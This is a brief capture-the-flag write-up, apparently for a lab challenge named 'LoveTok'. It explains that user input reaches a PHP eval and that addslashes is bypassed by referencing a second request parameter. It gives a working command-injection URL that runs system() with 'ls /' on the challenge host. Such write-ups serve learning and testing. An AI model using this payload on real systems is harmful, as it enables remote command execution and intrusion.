# LoveTok
Checking out the source code can see there's an eval on a user supplied param.
Need to bypass the addslashes call. Can do so by referencing other params in the request, eg.:
`http://159.65.89.136:30636/?format=${system($_GET[1])}&1=ls+/`
